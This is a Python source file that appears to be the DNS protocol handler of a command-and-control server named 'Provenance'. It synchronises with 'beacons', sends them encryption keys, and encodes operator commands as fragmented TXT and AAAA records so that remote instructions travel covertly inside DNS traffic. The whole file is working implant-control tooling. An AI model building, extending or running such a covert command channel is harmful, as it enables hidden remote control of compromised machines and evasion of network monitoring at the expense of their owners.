from dnslib import DNSRecord, QTYPE, TXT, AAAA, DNSError, RR, CLASS
from backend.handlers.protocolhandler import ProtocolHandler
from util.structs import CommandType, Command
from enum import Enum
from collections import deque
import logging



class Records(Enum):
    """ The types of records the DNSHandler can currently encode """
    TXT = (QTYPE.TXT, TXT, 252)
    AAAA = (QTYPE.AAAA, AAAA, 13)

class Domains(Enum):
    """ The valid subdomains used as function indicators by Resolution """
    SYNC = "sync"    
    ENCRYPT = "encrypt"
    QUERY = "query"
    CONFIRM = "confirm"

class Opcodes(Enum):
    NOP = 0
    ACK = 1
    KEY = 2
    DATA = 3
    EDATA = 4
    END = 5
    SYNCREQ = 6


class DNSHandler(ProtocolHandler):
    """ This is the Provenance Handler implementation for DNS beacons"""

    def __init__(self, ip, socket):
        super().__init__(ip, socket)
        self.logger = logging.getLogger("Provenance")
        self.latest_request_id = None
        self.edns = False
        self.fragments = deque()

    def __repr__(self):
        return "DNS"

    def synchronize(self, raw_request, port):
        """
        See protocolhandler.py
        """
        data = raw_request[0].strip()
        try:
            request = DNSRecord.parse(data)
            q = request.questions[0]
            # reverse the fqdn and split on "." for easier command fetching
            query = str(q.get_qname()).split(".")[::-1]
            if query[3] == Domains.SYNC.value:
                platform, hostname = query[5], query[4]
                self._send_data(request, port, Opcodes.ACK.value, None)
                return (platform, hostname)
            else:
                # Issue a SYNC-REQUEST if server went down and needs to resync
                self._send_data(request, port, Opcodes.SYNCREQ.value, None)
        except DNSError:
            self.logger.debug(f"[{self.ip}] synchronize: Packet Malformed")
        return ""

    def encrypt(self, raw_request, port, key):
        """
        See protocolhandler.py
        """
        data = raw_request[0].strip()
        try:
            request = DNSRecord.parse(data)
            q = request.questions[0]
            query = str(q.get_qname()).split(".")[::-1]
            if query[3] == Domains.ENCRYPT.value:
                self._send_data(request, port, Opcodes.KEY.value, key)
                return 1
            elif query[3] == Domains.CONFIRM.value:
                if query[4] == Domains.ENCRYPT.value:
                    self._send_data(request, port, Opcodes.ACK.value, None)
                    return 2
            else:
                # Return back to SYNC state, will perform SYNC-REQUEST
                self.logger.debug(f"{self.ip}: Client not in ENCRYPT. Falling back to SYNC")
                return 0

        except DNSError as e:
            self.logger.debug(f"[{self.ip}] encrypt: DNS Query Malformed")
            return 1

    def respond(self, raw_request, port, cmd):
        """
        See protocolhandler.py
        """
        cmd_opcode = 0 if cmd.type == CommandType.NOP else 3
        data = raw_request[0].strip()
        try:
            # if request.header.id != self.latest_id used for triplicate packets on windows
            request = DNSRecord.parse(data)
            q = request.questions[0]
            query = str(q.get_qname()).split(".")[::-1]
            if query[3] != Domains.QUERY.value:
                # Return back to SYNC state, will perform SYNC-REQUEST
                self.logger.debug(f"{self.ip}: Client not in QUERY. Falling back to SYNC")
                return 0
            
            # If opcode is a normal QUERY then procede
            opcode = request.header.get_opcode() 
            if opcode == 0: # STANDARD QUERY
                # If there are fragments to send, the beacon is waiting to
                # assemble a command from multiple packets
                if self.fragments:
                    frag = self.fragments.popleft()
                    self._send_fragment(request, frag, port)
                    if not self.fragments:
                        return 2
                    return 3
                # Otherwise we just send the next command
                self.latest_request_id = request.header.id
                self._send_data(request, port, cmd_opcode, cmd.command)
                return 2
            elif opcode == 1: # INVERSE QUERY (Deprecated)
                pass
            elif opcode == 2: # SERVER STATUS REQUEST
                pass
            elif opcode == 3: # RESERVED (NOT USED)
                pass
            elif opcode == 4: # NOTIFY
                pass
            elif opcode == 5: # 5 UPDATE
                pass
            else:
                pass
        except DNSError as e:
            self.logger.debug(f"[{self.ip}] respond: DNS Packet Malformed: {str(e)}")
        
        if self.fragments:
            return 3
        return 2
    
    def _send_fragment(self, query: DNSRecord, fragment, port: int):
        # TODO: DISALLOW RECORD SWITCHING BETWEEN FRAGMENTS
        # Generate skeleton question for packet
        response = query.reply()
        if query.questions[0].qtype == 16:
            constructor = TXT
        else:
            constructor = AAAA

        rr = RR(rname=query.get_q().get_qname(),
                rtype=query.questions[0].qtype,
                rclass=CLASS.IN,
                rdata=constructor(fragment),
                ttl=1337)
        response.add_answer(rr)
        self.socket.sendto(response.pack(), (self.ip, port))
        

    def _send_data(self, query: DNSRecord, port: int, opcode: int, data: str):
        """
        Send control packets to the client
        """

        rr_type = query.questions[0].qtype
        # Generate skeleton question for packet
        response = query.reply()
        
        if rr_type == 16:
            response = self._packetize_txt(query, response, rr_type, opcode, data)
        elif rr_type == 28:
            response, rest = self._packetize_aaaa(query, response, rr_type, opcode, data)
            self.fragments = rest
        else:
            self.logger.debug("send_data: invalid record")
            pass

        # Reply
        self.socket.sendto(response.pack(), (self.ip, port))

    def _packetize_txt(self, query, response, rr_type, opcode, data=None):
        _, constructor, msg_size = Records.TXT.value
        chunks = [f"{data[i:i+msg_size]}" for i in range(0, len(data), msg_size)] 
        if opcode == 0:
            response.add_answer(
                    RR(rname=query.get_q().get_qname(),
                    rtype=rr_type,
                    rclass=CLASS.IN,
                    rdata=constructor("010vsp1=This is a DNS TXT Record"),
                    ttl=1337)
            )
        else:
            for i, chunk in enumerate(chunks):
                answer = RR(
                        rname=query.get_q().get_qname(),
                        rtype=rr_type,
                        rclass=CLASS.IN,
                        rdata=constructor(f"{opcode}{len(chunks)}{i}" + chunk),
                        ttl=1337)
                response.add_answer(answer)
        return response


    def _packetize_aaaa(self, query, response, rr_type, opcode, data=None):
        if not data:
            data = "test"

        _, constructor, msg_size = Records.AAAA.value
        chunks = [data[i:i+msg_size] for i in range(0, len(data), msg_size)]
        rest = deque()
        if opcode == 0 or not data:
            response.add_answer(
                RR(
                    rname=query.get_q().get_qname(),
                    rtype=rr_type,
                    rclass=CLASS.IN,
                    # Send a nop packet of seq num 0, and expected length 1
                    rdata=constructor([0, 1, 0] + [0 for _ in range(13)]),
                    ttl=1337))
        else:
            for i, chunk in enumerate(chunks):
                #data = [opcode, i, len(chunks)] + [ord(c) for c in chunk]
                data = [opcode, len(chunks) - 1, i] + [ord(c) for c in chunk] #currently doing edns
                # Pad the data to 16 bytes
                data += [0 for _ in range(16 - len(data))]
                answer = RR(
                        rname=query.get_q().get_qname(),
                        rtype=rr_type,
                        rclass=CLASS.IN,
                        # 1st byte indicates data, second byte is seq number, 3rd is num transmission packets
                        rdata=constructor(data),
                        ttl=1337)
                
            
                # Add at least one response to the query
                if i == 0:
                    response.add_answer(answer)
                    continue

                # If Extended DNS is enabled, we can have up to 2048 bytes.
                # Otherwise we're going to send command over multiple queries
                if self.edns and i > 0:
                    response.add_answer(answer)
                else:
                    rest.append(data)
        return response, rest